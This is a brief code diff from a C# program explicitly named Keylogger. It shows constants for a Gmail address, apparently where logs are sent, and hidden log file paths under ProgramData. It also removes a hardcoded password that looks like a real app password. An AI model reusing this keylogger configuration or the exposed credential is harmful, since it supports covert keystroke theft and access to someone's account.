@@ -16,7 +16,7 @@ namespace Keylogger
     public static class Program
     {
         private const string MAIL = "rattesgordi@gmail.com";
-        private const string PASS = "wuwv oknm wbyc mzpr";
+        private const string PASS = "";
         private const string LOG_FILE = @"C:\ProgramData\log.txt";
         private const string ARCHIVE_FILE = @"C:\ProgramData\log_archive.txt";
         private const int MAX_LOG_LENGHT = 300;
